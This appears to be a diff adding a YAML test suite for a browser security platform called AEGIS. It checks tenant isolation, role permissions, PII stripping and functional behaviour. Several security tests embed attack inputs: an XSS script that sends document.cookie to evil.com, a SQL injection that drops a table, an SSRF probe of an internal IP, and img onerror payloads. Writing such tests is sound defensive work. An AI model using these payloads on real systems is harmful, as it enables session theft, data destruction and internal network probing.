@@ -1,0 +1,712 @@
+# @cavaridge/agent-test — AEGIS: Cybersecurity Agent Scenarios
+# Tests for the AEGIS browser security platform, covering:
+# - Tenant isolation of telemetry, devices, policies, scans, scores
+# - RBAC enforcement across portal tiers
+# - Security: enrollment token abuse, telemetry injection, scan abuse
+# - Functional: SaaS classification, score calculation, policy enforcement
+# - PHI/PII boundary tests for telemetry data
+
+battery: aegis-cybersecurity
+agentId: aegis-cybersecurity
+
+scenarios:
+  # ── Tenant Isolation Tests ───────────────────────────────────────
+
+  - id: aegis-tenant-001
+    name: Cross-tenant telemetry access blocked
+    description: MSP Admin from one MSP cannot view telemetry events from another MSP's devices
+    category: tenant_isolation
+    persona:
+      role: msp_admin
+      tenantId: tenant_evil_msp
+      tenantType: msp
+      userId: test_user_evil_msp_admin
+    input:
+      action: "list_telemetry"
+      targetTenantId: tenant_dit_msp
+    assertions:
+      - type: not_contains
+        field: result
+        value: "tenant_dit_msp"
+        description: Must not return telemetry from another tenant
+      - type: not_contains
+        field: result
+        value: "url_visit"
+        description: Must not leak browsing data from another tenant
+    expectedOutcome: pass
+    tags: [tenant_isolation, telemetry, critical]
+
+  - id: aegis-tenant-002
+    name: Cross-tenant device list isolated
+    description: Enrolled devices from one MSP must not be visible to another MSP
+    category: tenant_isolation
+    persona:
+      role: msp_admin
+      tenantId: tenant_evil_msp
+      tenantType: msp
+      userId: test_user_evil_msp_admin
+    input:
+      action: "list_devices"
+      filterTenantId: tenant_dit_msp
+    assertions:
+      - type: not_contains
+        field: result
+        value: "tenant_dit_msp"
+        description: Must not return devices from another tenant
+    expectedOutcome: pass
+    tags: [tenant_isolation, devices, critical]
+
+  - id: aegis-tenant-003
+    name: Cross-tenant policy access blocked
+    description: Policies created by one MSP must not be visible or modifiable by another MSP
+    category: tenant_isolation
+    persona:
+      role: msp_admin
+      tenantId: tenant_evil_msp
+      tenantType: msp
+      userId: test_user_evil_msp_admin
+    input:
+      action: "list_policies"
+      targetTenantId: tenant_dit_msp
+    assertions:
+      - type: not_contains
+        field: result
+        value: "tenant_dit_msp"
+        description: Must not return policies from another tenant
+    expectedOutcome: pass
+    tags: [tenant_isolation, policies, critical]
+
+  - id: aegis-tenant-004
+    name: Cross-tenant SaaS applications isolated
+    description: SaaS discovery data from one MSP cannot be accessed by another MSP
+    category: tenant_isolation
+    persona:
+      role: msp_admin
+      tenantId: tenant_evil_msp
+      tenantType: msp
+      userId: test_user_evil_msp_admin
+    input:
+      action: "list_saas_applications"
+      targetTenantId: tenant_dit_msp
+    assertions:
+      - type: not_contains
+        field: result
+        value: "tenant_dit_msp"
+        description: Must not return SaaS discovery data from another tenant
+    expectedOutcome: pass
+    tags: [tenant_isolation, saas, critical]
+
+  - id: aegis-tenant-005
+    name: Cross-tenant adjusted score isolated
+    description: Security scores from one MSP's clients cannot be accessed by another MSP
+    category: tenant_isolation
+    persona:
+      role: msp_admin
+      tenantId: tenant_evil_msp
+      tenantType: msp
+      userId: test_user_evil_msp_admin
+    input:
+      action: "get_adjusted_score"
+      clientTenantId: tenant_dit_client_compass
+    assertions:
+      - type: not_contains
+        field: result
+        value: "total_score"
+        description: Must not return score data for another tenant's client
+    expectedOutcome: pass
+    tags: [tenant_isolation, score, critical]
+
+  - id: aegis-tenant-006
+    name: Cross-tenant enrollment token access blocked
+    description: Enrollment tokens from one MSP cannot be used or viewed by another MSP
+    category: tenant_isolation
+    persona:
+      role: msp_admin
+      tenantId: tenant_evil_msp
+      tenantType: msp
+      userId: test_user_evil_msp_admin
+    input:
+      action: "list_enrollment_tokens"
+      targetTenantId: tenant_dit_msp
+    assertions:
+      - type: not_contains
+        field: result
+        value: "tenant_dit_msp"
+        description: Must not return enrollment tokens from another tenant
+    expectedOutcome: pass
+    tags: [tenant_isolation, enrollment, critical]
+
+  # ── RBAC Tests ───────────────────────────────────────────────────
+
+  - id: aegis-rbac-001
+    name: Client Viewer cannot create policies
+    description: Client Viewer has read-only access — must not create security policies
+    category: rbac
+    persona:
+      role: client_viewer
+      tenantId: tenant_compass_client
+      tenantType: client
+      userId: test_user_client_viewer
+    input:
+      action: "create_policy"
+      policy:
+        name: "Block gambling"
+        type: "url_block"
+        rules: [{"pattern": "*.gambling.com", "action": "block"}]
+    assertions:
+      - type: contains
+        field: result.error
+        value: "permission"
+        description: Must deny policy creation for Client Viewer
+    expectedOutcome: pass
+    tags: [rbac, policies]
+
+  - id: aegis-rbac-002
+    name: Client Admin cannot manage enrollment tokens
+    description: Enrollment is MSP-level — Client Admins cannot create or revoke tokens
+    category: rbac
+    persona:
+      role: client_admin
+      tenantId: tenant_compass_client
+      tenantType: client
+      userId: test_user_client_admin
+    input:
+      action: "create_enrollment_token"
+      label: "Unauthorized token"
+    assertions:
+      - type: contains
+        field: result.error
+        value: "permission"
+        description: Token creation must be denied for Client Admin
+    expectedOutcome: pass
+    tags: [rbac, enrollment]
+
+  - id: aegis-rbac-003
+    name: MSP Tech can view but not delete policies
+    description: MSP Tech has operational access — view policies yes, delete no
+    category: rbac
+    persona:
+      role: msp_tech
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_tech
+    input:
+      action: "delete_policy"
+      policyId: "policy_123"
+    assertions:
+      - type: contains
+        field: result.error
+        value: "permission"
+        description: Policy deletion must be denied for MSP Tech
+    expectedOutcome: pass
+    tags: [rbac, policies]
+
+  - id: aegis-rbac-004
+    name: Prospect can only access freemium scan
+    description: Prospect tier has no access to dashboards, devices, policies, or scores
+    category: rbac
+    persona:
+      role: prospect
+      tenantId: tenant_prospect_scan
+      tenantType: prospect
+      userId: test_user_prospect
+    input:
+      action: "list_devices"
+    assertions:
+      - type: contains
+        field: result.error
+        value: "access"
+        description: Must deny device listing for prospects
+    expectedOutcome: pass
+    tags: [rbac, prospect, critical]
+
+  - id: aegis-rbac-005
+    name: Client Admin can view SaaS applications but not reclassify
+    description: Only MSP Admin can change SaaS classification
+    category: rbac
+    persona:
+      role: client_admin
+      tenantId: tenant_compass_client
+      tenantType: client
+      userId: test_user_client_admin
+    input:
+      action: "update_saas_classification"
+      appId: "saas_app_123"
+      classification: "sanctioned"
+    assertions:
+      - type: contains
+        field: result.error
+        value: "permission"
+        description: Classification update must be denied for Client Admin
+    expectedOutcome: pass
+    tags: [rbac, saas]
+
+  # ── Security Scenarios ─────────────────────────────────────────
+
+  - id: aegis-sec-001
+    name: Enrollment token brute force protection
+    description: Invalid enrollment token must not reveal valid tokens or tenant info
+    category: security
+    persona:
+      role: anonymous
+      tenantId: none
+      tenantType: none
+      userId: none
+    input:
+      action: "enroll_device"
+      token: "AAAA-BBBB-CCCC-INVALID"
+    assertions:
+      - type: contains
+        field: result.error
+        value: "Invalid"
+        description: Must return generic error for invalid token
+      - type: not_contains
+        field: result
+        value: "tenant_id"
+        description: Must not leak tenant information
+    expectedOutcome: pass
+    tags: [security, enrollment, critical]
+
+  - id: aegis-sec-002
+    name: Revoked enrollment token rejected
+    description: Device attempting enrollment with a revoked token must be denied
+    category: security
+    persona:
+      role: anonymous
+      tenantId: none
+      tenantType: none
+      userId: none
+    input:
+      action: "enroll_device"
+      token: "REVOKED_TOKEN_12345"
+    assertions:
+      - type: contains
+        field: result.error
+        value: "revoked"
+        description: Must reject revoked enrollment tokens
+    expectedOutcome: pass
+    tags: [security, enrollment, critical]
+
+  - id: aegis-sec-003
+    name: Telemetry injection with spoofed device_id
+    description: Attacker cannot submit telemetry for a device_id they don't own
+    category: security
+    persona:
+      role: anonymous
+      tenantId: none
+      tenantType: none
+      userId: none
+    input:
+      action: "submit_telemetry"
+      deviceId: "spoofed_device_id_12345"
+      events:
+        - type: "url_visit"
+          domain: "evil.com"
+          timestamp: "2026-03-20T12:00:00Z"
+    assertions:
+      - type: contains
+        field: result.error
+        value: "Unknown device"
+        description: Must reject telemetry from unknown device_id
+    expectedOutcome: pass
+    tags: [security, telemetry, critical]
+
+  - id: aegis-sec-004
+    name: Telemetry from revoked device rejected
+    description: Device with revoked status must not be able to submit telemetry
+    category: security
+    persona:
+      role: anonymous
+      tenantId: none
+      tenantType: none
+      userId: none
+    input:
+      action: "submit_telemetry"
+      deviceId: "revoked_device_id"
+      events:
+        - type: "url_visit"
+          domain: "example.com"
+    assertions:
+      - type: contains
+        field: result.error
+        value: "revoked"
+        description: Must reject telemetry from revoked devices
+    expectedOutcome: pass
+    tags: [security, telemetry, critical]
+
+  - id: aegis-sec-005
+    name: XSS in telemetry event metadata
+    description: Attacker submits telemetry with XSS payload in title/URL fields
+    category: security
+    persona:
+      role: anonymous
+      tenantId: none
+      tenantType: none
+      userId: none
+    input:
+      action: "submit_telemetry"
+      deviceId: "valid_device_id"
+      events:
+        - type: "url_visit"
+          domain: "safe.com"
+          title: "<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>"
+          url: "https://safe.com/<img src=x onerror=alert(1)>"
+    assertions:
+      - type: not_contains
+        field: result
+        value: "<script>"
+        description: XSS payload must not be reflected in response
+    expectedOutcome: pass
+    tags: [security, xss, critical]
+
+  - id: aegis-sec-006
+    name: SQL injection in scan target
+    description: Attacker attempts SQL injection via the freemium scan target field
+    category: security
+    persona:
+      role: anonymous
+      tenantId: none
+      tenantType: none
+      userId: none
+    input:
+      action: "public_scan"
+      target: "'; DROP TABLE aegis.scan_results; --"
+    assertions:
+      - type: contains
+        field: result.error
+        value: "Invalid domain"
+        description: SQL injection payload must be rejected as invalid domain
+    expectedOutcome: pass
+    tags: [security, injection, critical]
+
+  - id: aegis-sec-007
+    name: SSRF via scan target
+    description: Attacker uses internal IP as scan target to probe internal network
+    category: security
+    persona:
+      role: msp_admin
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_admin
+    input:
+      action: "run_scan"
+      target: "192.168.1.1"
+    assertions:
+      - type: contains
+        field: result.error
+        value: "Invalid"
+        description: Internal IPs must not be scannable
+    expectedOutcome: pass
+    tags: [security, ssrf, critical]
+
+  - id: aegis-sec-008
+    name: Policy rules XSS prevention
+    description: Policy rules with script payloads must not execute when rendered
+    category: security
+    persona:
+      role: msp_admin
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_admin
+    input:
+      action: "create_policy"
+      policy:
+        name: "<script>alert('xss')</script>"
+        type: "url_block"
+        rules: [{"pattern": "<img src=x onerror=alert(1)>", "action": "block"}]
+    assertions:
+      - type: not_contains
+        field: result
+        value: "<script>"
+        description: XSS in policy name must be sanitized or escaped
+    expectedOutcome: pass
+    tags: [security, xss]
+
+  # ── PHI/PII Boundary Tests ──────────────────────────────────────
+
+  - id: aegis-pii-001
+    name: Telemetry does not store full URLs with query parameters
+    description: URL visit telemetry must strip or hash sensitive query parameters
+    category: pii_boundary
+    persona:
+      role: msp_admin
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_admin
+    input:
+      action: "get_telemetry_event"
+      eventId: "test_event_with_pii"
+    assertions:
+      - type: not_contains
+        field: result.url
+        value: "password="
+        description: Query parameters with credentials must be stripped
+      - type: not_contains
+        field: result.url
+        value: "ssn="
+        description: PII in query parameters must be stripped
+    expectedOutcome: pass
+    tags: [pii, telemetry, critical]
+
+  - id: aegis-pii-002
+    name: Scan results do not expose prospect email in API responses
+    description: Prospect email captured during freemium scan must not be returned in public responses
+    category: pii_boundary
+    persona:
+      role: anonymous
+      tenantId: none
+      tenantType: none
+      userId: none
+    input:
+      action: "get_scan_result"
+      scanId: "scan_with_prospect"
+    assertions:
+      - type: not_contains
+        field: result
+        value: "prospect_email"
+        description: Prospect PII must not be exposed in API responses
+    expectedOutcome: pass
+    tags: [pii, scan, critical]
+
+  - id: aegis-pii-003
+    name: Device telemetry does not log healthcare URLs
+    description: URLs matching healthcare domains must be flagged but not fully logged (HIPAA)
+    category: pii_boundary
+    persona:
+      role: msp_admin
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_admin
+    input:
+      action: "check_telemetry_filtering"
+      domain: "mychart.epic.com"
+      url: "https://mychart.epic.com/patient/12345/records"
+    assertions:
+      - type: not_contains
+        field: result.stored_url
+        value: "/patient/12345"
+        description: Patient-specific URL paths must not be stored
+    expectedOutcome: pass
+    tags: [pii, hipaa, telemetry, critical]
+
+  # ── Functional Scenarios ─────────────────────────────────────────
+
+  - id: aegis-func-001
+    name: SaaS classification identifies known applications
+    description: URL visits to known SaaS domains must be correctly classified
+    category: functional
+    persona:
+      role: msp_admin
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_admin
+    input:
+      action: "classify_domain"
+      domain: "app.slack.com"
+    assertions:
+      - type: contains
+        field: result.name
+        value: "Slack"
+        description: Slack domain must classify to Slack application
+      - type: contains
+        field: result.category
+        value: "collaboration"
+        description: Slack must be categorized as collaboration
+    expectedOutcome: pass
+    tags: [functional, saas_classification]
+
+  - id: aegis-func-002
+    name: SaaS classification handles subdomains
+    description: Subdomain variations of known SaaS must still match
+    category: functional
+    persona:
+      role: msp_admin
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_admin
+    input:
+      action: "classify_domain"
+      domain: "company.sharepoint.com"
+    assertions:
+      - type: contains
+        field: result.name
+        value: "Microsoft 365"
+        description: SharePoint subdomains must classify to M365
+    expectedOutcome: pass
+    tags: [functional, saas_classification]
+
+  - id: aegis-func-003
+    name: Adjusted score calculates with Phase 1 signals only
+    description: Score calculation must work with only SaaS and browser signals active
+    category: functional
+    persona:
+      role: msp_admin
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_admin
+    input:
+      action: "calculate_score"
+    assertions:
+      - type: contains
+        field: result
+        value: "totalScore"
+        description: Must return a totalScore field
+      - type: contains
+        field: result.signals.saas_shadow_it.status
+        value: "active"
+        description: SaaS Shadow IT signal must be active
+      - type: contains
+        field: result.signals.browser_security.status
+        value: "active"
+        description: Browser Security signal must be active
+      - type: contains
+        field: result.signals.microsoft_secure_score.status
+        value: "not_configured"
+        description: Microsoft Secure Score must show not_configured in Phase 1
+    expectedOutcome: pass
+    tags: [functional, score]
+
+  - id: aegis-func-004
+    name: Enrollment flow returns required fields
+    description: Successful enrollment must return deviceId, tenantId, policies, cache interval
+    category: functional
+    persona:
+      role: anonymous
+      tenantId: none
+      tenantType: none
+      userId: none
+    input:
+      action: "enroll_device"
+      token: "VALID_ENROLLMENT_TOKEN"
+    assertions:
+      - type: contains
+        field: result
+        value: "deviceId"
+        description: Must return deviceId
+      - type: contains
+        field: result
+        value: "tenantId"
+        description: Must return tenantId
+      - type: contains
+        field: result
+        value: "policies"
+        description: Must return initial policy set
+      - type: contains
+        field: result
+        value: "policyCacheMinutes"
+        description: Must return policy cache interval
+    expectedOutcome: pass
+    tags: [functional, enrollment]
+
+  - id: aegis-func-005
+    name: External scan produces DNS findings
+    description: External posture scan must check SPF, DMARC, MX, and TLS
+    category: functional
+    persona:
+      role: msp_admin
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_admin
+    input:
+      action: "run_scan"
+      target: "example.com"
+      scanType: "external_posture"
+    assertions:
+      - type: contains
+        field: result
+        value: "score"
+        description: Scan must return a score
+      - type: contains
+        field: result
+        value: "findings"
+        description: Scan must return findings array
+      - type: contains
+        field: result.summary.checks
+        value: "dns"
+        description: DNS check must be included
+    expectedOutcome: pass
+    tags: [functional, scan]
+
+  - id: aegis-func-006
+    name: Telemetry batch accepts and classifies events
+    description: Batch telemetry endpoint must accept events and classify SaaS domains
+    category: functional
+    persona:
+      role: anonymous
+      tenantId: none
+      tenantType: none
+      userId: none
+    input:
+      action: "submit_telemetry"
+      deviceId: "valid_enrolled_device"
+      events:
+        - type: "url_visit"
+          domain: "slack.com"
+          url: "https://app.slack.com/client"
+          timestamp: "2026-03-20T12:00:00Z"
+        - type: "url_visit"
+          domain: "unknown-saas.io"
+          url: "https://unknown-saas.io/dashboard"
+          timestamp: "2026-03-20T12:00:01Z"
+    assertions:
+      - type: contains
+        field: result
+        value: "accepted"
+        description: Must return count of accepted events
+      - type: contains
+        field: result
+        value: "classified"
+        description: Must return count of classified SaaS domains
+    expectedOutcome: pass
+    tags: [functional, telemetry, saas_classification]
+
+  - id: aegis-func-007
+    name: Policy enforcement via declarativeNetRequest
+    description: URL block policy must produce valid declarativeNetRequest rules
+    category: functional
+    persona:
+      role: msp_admin
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_admin
+    input:
+      action: "get_device_policies"
+      deviceId: "valid_device"
+    assertions:
+      - type: contains
+        field: result
+        value: "policies"
+        description: Must return policies array
+      - type: contains
+        field: result
+        value: "cacheMinutes"
+        description: Must include cache duration
+    expectedOutcome: pass
+    tags: [functional, policies, extension]
+
+  - id: aegis-func-008
+    name: SaaS category breakdown aggregation
+    description: SaaS by-category endpoint must aggregate correctly
+    category: functional
+    persona:
+      role: msp_admin
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_admin
+    input:
+      action: "get_saas_by_category"
+    assertions:
+      - type: contains
+        field: result.data[0]
+        value: "category"
+        description: Must return category name
+      - type: contains
+        field: result.data[0]
+        value: "count"
+        description: Must return app count per category
+      - type: contains
+        field: result.data[0]
+        value: "avg_risk"
+        description: Must return average risk per category
+    expectedOutcome: pass
+    tags: [functional, saas, dashboard]
